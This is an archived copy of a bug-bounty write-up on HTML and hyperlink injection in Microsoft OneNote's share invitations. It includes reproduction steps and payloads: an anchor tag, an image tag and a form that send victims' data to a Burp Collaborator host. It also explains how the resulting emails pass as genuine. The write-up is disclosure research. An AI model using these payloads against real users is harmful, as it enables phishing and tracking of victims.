---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-06-28_html-and-hyperlink-injection-via-share-option-in-microsoft-onenote-application.md
original_filename: 2022-06-28_html-and-hyperlink-injection-via-share-option-in-microsoft-onenote-application.md
title: HTML and Hyperlink Injection via Share Option In Microsoft Onenote Application
category: notes
detected_topics:
- xss
- command-injection
tags:
- imported
- notes
- xss
- command-injection
language: en
raw_sha256: 93b03f13a0acc8f91b1934e658b5be60f4ed82ab02055ae55e2e7d1a2a41ec9f
text_sha256: 84e9727a0c273316d7f6fa1555c29b5728a85dff509f50921fcdd06afa80b683
ingested_at: '2026-06-28T07:32:12Z'
sensitivity: unknown
redactions_applied: false
---

# HTML and Hyperlink Injection via Share Option In Microsoft Onenote Application

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-06-28_html-and-hyperlink-injection-via-share-option-in-microsoft-onenote-application.md
- Source Type: markdown
- Detected Topics: xss, command-injection
- Ingested At: 2026-06-28T07:32:12Z
- Redactions Applied: False
- Raw SHA256: `93b03f13a0acc8f91b1934e658b5be60f4ed82ab02055ae55e2e7d1a2a41ec9f`
- Text SHA256: `84e9727a0c273316d7f6fa1555c29b5728a85dff509f50921fcdd06afa80b683`


## Content

---
title: "HTML and Hyperlink Injection via Share Option In Microsoft Onenote Application"
page_title: "Medium"
url: "https://infosecwriteups.com/html-and-hyperlink-injection-via-share-option-in-microsoft-onenote-application-47e94d0e6478"
authors: ["Divyanshu Shukla (@justm0rph3u5)"]
programs: ["Microsoft"]
bugs: ["HTML injection", "Phishing"]
publication_date: "2022-06-28"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2510
scraped_via: "browseros"
---

# HTML and Hyperlink Injection via Share Option In Microsoft Onenote Application

HTML and Hyperlink Injection via Share Option In Microsoft Onenote Application
Divyanshu
Follow
4 min read
·
Jun 29, 2022

51

1

Hyperlink Injection it’s when attacker injecting a malicious link when sending an email invitation. HTML injection attack is injecting HTML code through the vulnerable parts of the website. The Malicious user sends HTML code through any vulnerable field with a purpose to change the website’s design or any information, that is displayed to the user. It is possible to inject html code in the message filed, which can be used to redirect user to malicious website and also causes change of website content via tag.

Hyperlink injection in the email can lead to phishing via email directly to users.
Attacker can share one with fake titles like “You have won 1000 RS. Click to claim”.
And in the mail, itself due to HTML injection, it is possible to inject HTML code and make the URL Hyperlink. Which can be further added to make fake emails.
In the mail header itself shows via outlook.com, which makes the email genuine.
Only thing attacker need is a email and in case of company (organization email) this can be used bypass the phishing protections.
HTML injection in the using tag for href attribute can be used for redirecting user to fake IP or redirect traffic to any IP , which can further redirect the traffic to domain .
Fake links can be used for collecting user information such as IP address and browser info via user agent and location. By putting tags it can lead to partial defacement by changing the font size and look.
Only thing attacker need is a email and in case of company (organisation email) this can be used bypass the phishing protections.
Steps to Reproduce:
Create New Notebook and login via attacker@outlook.com user.
Click on share in the right corner. In the `Sharing Options > Invite People to Notebook.
Press enter or click to view image in full size
Then Type Email and Include Message.
In the include message enter any of the below mentioned payload:
Press enter or click to view image in full size

1) HTML <a> Tag: <a href=”https://burpcollaboratorlink.burpcollaborator.net"> Click to win</a>

Get Divyanshu’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

2) Image Tag: <img src=”https://burpcollaboratorlink.burpcollaborator.net">

3) HTML FORM:

< html>
< body>
< h2 >HTML Forms< /h2 >
< form action="burp-coolaborator.burpcollaborator.net">
< label for="fname">First name:< /label>< br>
< input type="text" id="fname" name="fname" value="John">< br>
< label for="lname">Last name:< /label>< br>
< input type="text" id="lname" name="lname" value="Doe">< br>< br>
< input type="submit" value="Submit">
< /form>
< p>Click to win< /p>
< /body>
< /html>
Press enter or click to view image in full size
HTML Form
Share it with the victims.
Check the phishing email on outlook.
Press enter or click to view image in full size
Outlook <a> tag
Press enter or click to view image in full size
Outlook phishing email
Check the email on gmail.
Press enter or click to view image in full size
Gmail phishing email
Once victim will click on the link it will be redirected to malicious website.
Press enter or click to view image in full size
Burp collaborator IP callback of victim
Impact
HTML injection in the using tag for href attribute can be used for redirecting user to fake IP or redirect traffic to any IP , which can further redirect the traffic to domain .
Fake links can be used for collecting user information such as IP address and browser info via user agent and location.

Once the issue was fixed it was marked as out of scope by the MSRC program.

Press enter or click to view image in full size

From Infosec Writeups: A lot is coming up in the Infosec every day that it’s hard to keep up with. Join our weekly newsletter to get all the latest Infosec trends in the form of 5 articles, 4 Threads, 3 videos, 2 Github Repos and tools, and 1 job alert for FREE! https://weekly.infosecwriteups.com/
